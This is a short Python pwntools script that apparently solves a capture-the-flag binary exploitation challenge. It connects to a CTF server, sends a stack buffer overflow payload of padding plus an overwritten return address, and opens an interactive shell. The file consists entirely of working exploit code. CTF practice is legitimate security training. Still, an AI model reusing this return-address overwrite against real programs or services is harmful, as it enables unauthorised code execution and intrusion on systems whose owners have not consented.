from pwn import *

q = remote('pwn.challenge.ctf.show',28303)

q.sendline('255')

payload = b'a'*(0x10+8)+p64(0x04006EA)

q.sendlineafter("What's u name?",payload)

q.interactive()

